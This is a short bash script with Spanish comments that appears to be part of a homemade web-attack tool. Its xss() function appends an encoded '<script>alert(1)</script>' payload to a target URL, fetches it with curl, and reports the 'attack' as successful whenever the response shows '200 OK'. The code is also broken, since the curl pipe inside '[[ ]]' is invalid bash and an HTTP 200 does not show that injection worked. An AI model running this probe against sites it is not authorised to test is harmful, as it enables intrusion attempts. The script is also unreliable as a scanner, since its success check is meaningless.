#!/bin/bash
xss() {
#aqui ejecutamos xss con get, checkear si esta search
if [[ $search ]] # | grep 'method=\"GET\"' ]]
then
  XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
  ATTACK="$URL$XSS"
  if [[ curl -i $ATTACK | grep "200 OK" ]]
  then
    echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
  else
    echo "Disculpa, el ataque no ha funcionado."
    'volvermenu'
  fi
fi
}
